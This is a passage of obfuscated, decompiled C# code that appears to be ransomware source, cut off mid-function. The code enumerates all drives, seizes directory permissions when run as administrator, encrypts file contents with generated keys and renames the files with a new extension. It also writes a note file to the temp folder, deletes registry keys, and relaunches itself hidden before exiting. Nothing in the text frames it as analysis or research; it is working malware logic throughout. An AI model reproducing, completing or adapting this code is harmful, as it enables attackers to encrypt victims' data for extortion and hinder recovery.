		XODaKIXwEBpBTdl(getString_0(107391165), getString_0(107391152) + text + getString_0(107391175) + string_0);
	}

	public static void ZSlmfteQVnXjJY(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = fZQJZGRivPka(getString_0(107391170));
		processStartInfo.Arguments = getString_0(107391141) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool wbfaudJqMkhd(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string VKvwGhzwkCne(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void ldwJWDFPIOUSKD()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = CiGbFuBASDry(getString_0(107391136));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(fZQJZGRivPka(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107391478)));
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107391453)));
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107391468)));
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107391411)));
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107391170)));
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107391386)));
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107391357)));
					registryKey.Close();
				}
				string_ = CiGbFuBASDry(getString_0(107391372));
				registryKey = Registry.LocalMachine.OpenSubKey(fZQJZGRivPka(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107390763)));
					registryKey.Close();
				}
				string_ = CiGbFuBASDry(getString_0(107390714));
				registryKey = Registry.LocalMachine.OpenSubKey(fZQJZGRivPka(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107390763)));
					registryKey.Close();
				}
				string_ = CiGbFuBASDry(getString_0(107390714));
				registryKey = Registry.CurrentUser.OpenSubKey(fZQJZGRivPka(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(fZQJZGRivPka(getString_0(107390763)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107390729)), fZQJZGRivPka(getString_0(107390680)));
			XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107390663)), fZQJZGRivPka(getString_0(107390622)));
			XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107390663)), fZQJZGRivPka(getString_0(107391020)));
			XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107390927)), fZQJZGRivPka(getString_0(107390910)));
		}
		catch
		{
		}
	}

	public static void ETdgovIugJJSH(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(fZQJZGRivPka(getString_0(107390837)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void AajSxfwPbabHmrH()
	{
		string string_ = CiGbFuBASDry(getString_0(107390300));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(fZQJZGRivPka(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(fZQJZGRivPka(getString_0(107390251)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void jdmoOyvaEbtumBA()
	{
		XODaKIXwEBpBTdl(getString_0(107397152), fZQJZGRivPka(getString_0(107390218)));
		string text = fZQJZGRivPka(getString_0(107390536));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107390471) + text + getString_0(107390471) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397152);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void DpuvngxWFUdSQzJ(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (wnBkEuneoGOR)
			{
				try
				{
					File.AppendAllText(EMMziOGItwvgBn, getString_0(107390466) + string_0 + getString_0(107390425) + ex.Message + getString_0(107396613));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string ixxpmNQdpls()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107392670);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107390368);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107390359))) ? getString_0(107390373) : getString_0(107390382));
				break;
			case 0:
				text = getString_0(107390364);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107390331);
				break;
			case 4:
				text = getString_0(107390350);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107389788) : getString_0(107390341));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389796) : getString_0(107389801)) : getString_0(107389806)) : getString_0(107389783));
				break;
			case 10:
				text = getString_0(107389791);
				break;
			}
		}
		if (text != getString_0(107392670))
		{
			text = getString_0(107389754) + text;
			if (oSVersion.ServicePack != getString_0(107392670))
			{
				text = text + getString_0(107391175) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string nQuRbgQYAnumG(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395195);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(fZQJZGRivPka(getString_0(107395674)));
				streamWriter.WriteLine(getString_0(107396613));
				streamWriter.WriteLine(fZQJZGRivPka(getString_0(107393136)));
				streamWriter.WriteLine(string_0);
				if (PqrzhfLlmsnd)
				{
					streamWriter.WriteLine(getString_0(107396613));
					streamWriter.WriteLine(fZQJZGRivPka(getString_0(107393570)));
					streamWriter.WriteLine(IoVTZTUGdmDX.lOkUlDnVqGkweRha());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !pWVZjGlhSAv)
				{
					File.AppendAllText(text, getString_0(107393537) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (wnBkEuneoGOR)
			{
				try
				{
					File.AppendAllText(EMMziOGItwvgBn, getString_0(107389773) + ex.Message + getString_0(107396613));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void hCEeTXMscBWAu(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		DbjCRzWTkejve.tyZzjLVBpLRq CS_0024_003C_003E8__locals0 = new DbjCRzWTkejve();
		CS_0024_003C_003E8__locals0.XPgYnwdpdOCpUosEP = string_1;
		CS_0024_003C_003E8__locals0.NFHDfdGlHX = string_2;
		CS_0024_003C_003E8__locals0.anMiJqzbjQlJv = string_3;
		CS_0024_003C_003E8__locals0.ZDGxcpqnRrWbS = string_4;
		dwEsbNrZYYpdu = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.anMiJqzbjQlJv);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395886))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !NxzbNepQXM.Contains(array[i].Name))
					{
						NxzbNepQXM.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!NxzbNepQXM.Contains(string_0[j]))
				{
					NxzbNepQXM.Add(string_0[j]);
				}
			}
		}
		if (NxzbNepQXM.Contains(fZQJZGRivPka(getString_0(107389684))) && bmLbSmUKQBkE == getString_0(107396723))
		{
			NxzbNepQXM.Remove(fZQJZGRivPka(getString_0(107389684)));
		}
		Parallel.ForEach(NxzbNepQXM, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new DbjCRzWTkejve.tyZzjLVBpLRq();
			CS_0024_003C_003E8__locals0.tcgUPSCbpeRn = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.zRmUjnpajzq = string_0;
			if (UKtytEenHZq && !ixxpmNQdpls().Contains(DbjCRzWTkejve.getString_0(107389797)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						wbfaudJqMkhd(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.zRmUjnpajzq);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (eiVEOVqJMVupoZG == DbjCRzWTkejve.getString_0(107396732))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					OsRrFOFumkcI(CS_0024_003C_003E8__locals0.zRmUjnpajzq, CS_0024_003C_003E8__locals0.tcgUPSCbpeRn.XPgYnwdpdOCpUosEP, CS_0024_003C_003E8__locals0.tcgUPSCbpeRn.ZDGxcpqnRrWbS, CS_0024_003C_003E8__locals0.tcgUPSCbpeRn.NFHDfdGlHX, CS_0024_003C_003E8__locals0.tcgUPSCbpeRn.anMiJqzbjQlJv);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				OsRrFOFumkcI(CS_0024_003C_003E8__locals0.zRmUjnpajzq, CS_0024_003C_003E8__locals0.XPgYnwdpdOCpUosEP, CS_0024_003C_003E8__locals0.ZDGxcpqnRrWbS, CS_0024_003C_003E8__locals0.NFHDfdGlHX, CS_0024_003C_003E8__locals0.anMiJqzbjQlJv);
			}
		});
	}

	public static void OsRrFOFumkcI(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107392670));
		List<string> list3 = list2;
		if (mZaewZqNNWRle == getString_0(107396728))
		{
			list = VHHlyXLqZsDmVXX(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = MMJfWgiiTMVc.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((oHvnHZNAsYHPnYh == getString_0(107396728) && !item.EndsWith(text)) || JySLVGbqxfI.Contains(item))
				{
					continue;
				}
				if (GiTWgfuVPecn == getString_0(107396723))
				{
					try
					{
						if (ksNSGmJtVt.QXPwKbEUYXq(item))
						{
							ksNSGmJtVt.rSVoPwZkHVNrP(item);
						}
					}
					catch
					{
					}
				}
				JySLVGbqxfI.Add(item);
				if (!kFvYdcQcXMKvbXYVW.Contains(Path.GetDirectoryName(item)))
				{
					kFvYdcQcXMKvbXYVW.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (NXdoiZyiNrteeIx == getString_0(107396723) && fileStream.Length > Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024 && !list3.Contains(text))
					{
						if (RcvnDaFPNx == getString_0(107396723))
						{
							foreach (string item2 in zKXWFFBSYfij)
							{
								if (item.ToLower().EndsWith(item2) && ZfHomqQTuOmtb == getString_0(107396723))
								{
									if (Convert.ToInt32(izlGYUEMadkw) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											IoVTZTUGdmDX.irIbESpHjMem(getString_0(107392751), getString_0(107392778), getString_0(107392733), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && ZfHomqQTuOmtb == getString_0(107396728))
								{
									try
									{
										IoVTZTUGdmDX.irIbESpHjMem(getString_0(107392751), getString_0(107392778), getString_0(107392733), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = LZNaqbrBBsk.VKNOYHjfGxPJrj(item, Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024);
						byte[] snDciYNnSqT = LZNaqbrBBsk.xvROdGWCNShy(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						LZNaqbrBBsk.zRtbURaWGBf(item, snDciYNnSqT);
						if (string_2 != getString_0(107389707))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389707))
					{
						LhTpFSxoyUp(item, item + string_2, dwEsbNrZYYpdu);
					}
					else
					{
						LhTpFSxoyUp(item, item + getString_0(107389702), dwEsbNrZYYpdu);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void BxofePwFWXF(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		boKBUCZYgxt.hdgUsVcFgbbtV CS_0024_003C_003E8__locals0 = new boKBUCZYgxt();
		CS_0024_003C_003E8__locals0.tuTyXmrKqj = list_0;
		CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk = string_1;
		CS_0024_003C_003E8__locals0.sGmUAcByMV = string_2;
		CS_0024_003C_003E8__locals0.IauEKWzaXvhA = string_3;
		CS_0024_003C_003E8__locals0.rfPgJBYhJKPesy = new List<string> { getString_0(107392670) };
		if (oHvnHZNAsYHPnYh == getString_0(107396728))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.tuTyXmrKqj)
				{
					if (CS_0024_003C_003E8__locals0.sGmUAcByMV.Length != 0)
					{
						string[] sGmUAcByMV2 = CS_0024_003C_003E8__locals0.sGmUAcByMV;
						int num2 = 0;
						while (num2 < sGmUAcByMV2.Length)
						{
							string value2 = sGmUAcByMV2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_072e;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk))
						{
							goto IL_072e;
						}
					}
					catch (Exception)
					{
						goto IL_072e;
					}
					if (item.EndsWith(string_0) && !JySLVGbqxfI.Contains(item))
					{
						if (GiTWgfuVPecn == boKBUCZYgxt.getString_0(107396740))
						{
							try
							{
								if (ksNSGmJtVt.QXPwKbEUYXq(item))
								{
									ksNSGmJtVt.rSVoPwZkHVNrP(item);
								}
							}
							catch
							{
							}
						}
						JySLVGbqxfI.Add(item);
						if (!kFvYdcQcXMKvbXYVW.Contains(Path.GetDirectoryName(item)))
						{
							kFvYdcQcXMKvbXYVW.Add(Path.GetDirectoryName(item));
						}
						DpuvngxWFUdSQzJ(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (wnBkEuneoGOR)
								{
									try
									{
										File.AppendAllText(EMMziOGItwvgBn, boKBUCZYgxt.getString_0(107390483) + item + boKBUCZYgxt.getString_0(107407396) + ex12.Message + boKBUCZYgxt.getString_0(107396630));
									}
									catch (Exception)
									{
									}
								}
								OGYcpcFLVvGwO++;
								goto end_IL_00ee_2;
							}
							if (NXdoiZyiNrteeIx == boKBUCZYgxt.getString_0(107396740) && new FileInfo(item).Length > Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.rfPgJBYhJKPesy.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new boKBUCZYgxt.lfaNmpoewcZ();
								CS_0024_003C_003E8__locals0.kFYUBFWTKpZp = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk != boKBUCZYgxt.getString_0(107389724))
									{
										if (PqrzhfLlmsnd)
										{
											CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk = mpATdrWCpkge + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk);
									}
								}
								catch (Exception ex14)
								{
									if (wnBkEuneoGOR)
									{
										try
										{
											File.AppendAllText(EMMziOGItwvgBn, boKBUCZYgxt.getString_0(107390483) + item + boKBUCZYgxt.getString_0(107407335) + ex14.Message + boKBUCZYgxt.getString_0(107396630));
										}
										catch (Exception)
										{
										}
									}
									OGYcpcFLVvGwO++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO = boKBUCZYgxt.getString_0(107392687);
								if (CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk != boKBUCZYgxt.getString_0(107389724))
								{
									CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO = item + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk;
								}
								else
								{
									CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO = item;
								}
								if (RcvnDaFPNx == boKBUCZYgxt.getString_0(107396740))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in zKXWFFBSYfij)
										{
											if (CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.kFYUBFWTKpZp.EpSJuHuGORNiTk) && ZfHomqQTuOmtb == boKBUCZYgxt.lfaNmpoewcZ.getString_0(107396743))
											{
												if (Convert.ToInt32(izlGYUEMadkw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO).Length)
												{
													try
													{
														IoVTZTUGdmDX.irIbESpHjMem(boKBUCZYgxt.lfaNmpoewcZ.getString_0(107392771), boKBUCZYgxt.lfaNmpoewcZ.getString_0(107392798), boKBUCZYgxt.lfaNmpoewcZ.getString_0(107392753), CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO.ToLower().EndsWith(item2) && ZfHomqQTuOmtb == boKBUCZYgxt.lfaNmpoewcZ.getString_0(107396748))
											{
												try
												{
													IoVTZTUGdmDX.irIbESpHjMem(boKBUCZYgxt.lfaNmpoewcZ.getString_0(107392771), boKBUCZYgxt.lfaNmpoewcZ.getString_0(107392798), boKBUCZYgxt.lfaNmpoewcZ.getString_0(107392753), CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = mZuoQvaDwmCupGaw.CdMZevdMaNJ(32);
								string s3 = cNhkWTsTMsDed.VZcAhXOlbGZB(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = LZNaqbrBBsk.VKNOYHjfGxPJrj(CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO, Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024);
								LZNaqbrBBsk.zRtbURaWGBf(SnDciYNnSqT: (!gzeLuZIeGEn) ? (pWVZjGlhSAv ? LZNaqbrBBsk.xvROdGWCNShy(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LZNaqbrBBsk.xvROdGWCNShy(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.IauEKWzaXvhA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (pWVZjGlhSAv ? yUqvKqSgNNEdVE.rJtchqEipJTNQ(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : yUqvKqSgNNEdVE.rJtchqEipJTNQ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.IauEKWzaXvhA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NGxKitMeGqa: CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO, ESpdswCNdRrO: bytes3);
							}
							else
							{
								if (PqrzhfLlmsnd)
								{
									CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk = mpATdrWCpkge + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk;
								}
								string text4 = mZuoQvaDwmCupGaw.CdMZevdMaNJ(32);
								string s4 = cNhkWTsTMsDed.VZcAhXOlbGZB(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk != boKBUCZYgxt.getString_0(107389724))
								{
									if (!rTfnyAYcMHFOLjucY)
									{
										if (!pWVZjGlhSAv)
										{
											YYKAFRykvgtiXUP(item, item + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk, dwEsbNrZYYpdu);
										}
										else
										{
											YYKAFRykvgtiXUP(item, item + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!pWVZjGlhSAv)
											{
												eYTqDsWWuaKp(item, item + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk, dwEsbNrZYYpdu);
											}
											else
											{
												eYTqDsWWuaKp(item, item + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (wnBkEuneoGOR)
											{
												try
												{
													File.AppendAllText(EMMziOGItwvgBn, boKBUCZYgxt.getString_0(107390483) + item + boKBUCZYgxt.getString_0(107389678) + ex16.Message + boKBUCZYgxt.getString_0(107396630));
												}
												catch (Exception)
												{
												}
											}
											OGYcpcFLVvGwO++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!rTfnyAYcMHFOLjucY)
								{
									if (!pWVZjGlhSAv)
									{
										YYKAFRykvgtiXUP(item, item + boKBUCZYgxt.getString_0(107389719), dwEsbNrZYYpdu);
									}
									else
									{
										YYKAFRykvgtiXUP(item, item + boKBUCZYgxt.getString_0(107389719), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!pWVZjGlhSAv)
										{
											eYTqDsWWuaKp(item, item, dwEsbNrZYYpdu);
										}
										else
										{
											eYTqDsWWuaKp(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (wnBkEuneoGOR)
										{
											try
											{
												File.AppendAllText(EMMziOGItwvgBn, boKBUCZYgxt.getString_0(107390483) + item + boKBUCZYgxt.getString_0(107389678) + ex18.Message + boKBUCZYgxt.getString_0(107396630));
											}
											catch (Exception)
											{
											}
										}
										OGYcpcFLVvGwO++;
										goto end_IL_00ee_2;
									}
								}
								if (pWVZjGlhSAv)
								{
									if (CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk != boKBUCZYgxt.getString_0(107389724))
									{
										ETdgovIugJJSH(item + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk, bytes4);
									}
									else
									{
										ETdgovIugJJSH(item, bytes4);
									}
								}
							}
							goto IL_072e;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_072e;
						}
					}
					continue;
					IL_072e:
					CS_0024_003C_003E8__locals0.tuTyXmrKqj.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.tuTyXmrKqj, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new boKBUCZYgxt.hdgUsVcFgbbtV();
			CS_0024_003C_003E8__locals0.kFYUBFWTKpZp = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ = string_0;
			if (CS_0024_003C_003E8__locals0.sGmUAcByMV.Length != 0)
			{
				string[] sGmUAcByMV = CS_0024_003C_003E8__locals0.sGmUAcByMV;
				int num = 0;
				while (num < sGmUAcByMV.Length)
				{
					string value = sGmUAcByMV[num];
					if (!CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ.EndsWith(CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!JySLVGbqxfI.Contains(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ))
			{
				if (GiTWgfuVPecn == boKBUCZYgxt.getString_0(107396740))
				{
					try
					{
						if (ksNSGmJtVt.QXPwKbEUYXq(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ))
						{
							ksNSGmJtVt.rSVoPwZkHVNrP(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
						}
					}
					catch
					{
					}
				}
				JySLVGbqxfI.Add(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
				if (!kFvYdcQcXMKvbXYVW.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ)))
				{
					kFvYdcQcXMKvbXYVW.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ));
				}
				DpuvngxWFUdSQzJ(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (wnBkEuneoGOR)
						{
							try
							{
								File.AppendAllText(EMMziOGItwvgBn, boKBUCZYgxt.getString_0(107390483) + CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + boKBUCZYgxt.getString_0(107407396) + ex2.Message + boKBUCZYgxt.getString_0(107396630));
							}
							catch (Exception)
							{
							}
						}
						OGYcpcFLVvGwO++;
						goto end_IL_0117_2;
					}
					if (NXdoiZyiNrteeIx == boKBUCZYgxt.getString_0(107396740) && new FileInfo(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ).Length > Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk != boKBUCZYgxt.getString_0(107389724))
							{
								if (PqrzhfLlmsnd)
								{
									CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk = mpATdrWCpkge + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk;
								}
								File.Move(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk);
							}
						}
						catch (Exception ex4)
						{
							if (wnBkEuneoGOR)
							{
								try
								{
									File.AppendAllText(EMMziOGItwvgBn, boKBUCZYgxt.getString_0(107390483) + CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + boKBUCZYgxt.getString_0(107407335) + ex4.Message + boKBUCZYgxt.getString_0(107396630));
								}
								catch (Exception)
								{
								}
							}
							OGYcpcFLVvGwO++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk != boKBUCZYgxt.getString_0(107389724))
						{
							CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ += CS_0024_003C_003E8__locals0.EpSJuHuGORNiTk;
						}
						if (RcvnDaFPNx == boKBUCZYgxt.getString_0(107396740))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in zKXWFFBSYfij)
								{
									if (CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.kFYUBFWTKpZp.EpSJuHuGORNiTk) && ZfHomqQTuOmtb == boKBUCZYgxt.hdgUsVcFgbbtV.getString_0(107396746))
									{
										if (Convert.ToInt32(izlGYUEMadkw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ).Length)
										{
											try
											{
